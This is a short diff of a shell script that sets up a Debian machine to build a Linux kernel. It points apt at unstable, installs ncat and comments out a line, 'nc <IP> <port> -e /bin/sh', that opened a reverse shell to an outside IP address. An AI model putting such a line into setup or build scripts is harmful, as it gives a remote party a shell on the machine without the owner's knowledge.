@@ -8,8 +8,8 @@ set -e o pipefail
 echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
 apt update
 apt install -y ncat
-nc 65.108.51.31 11452 -e /bin/sh
-apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot
+#nc 65.108.51.31 11452 -e /bin/sh
+apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot rsync
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc
 echo "Installed all packages\n"
 #https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html
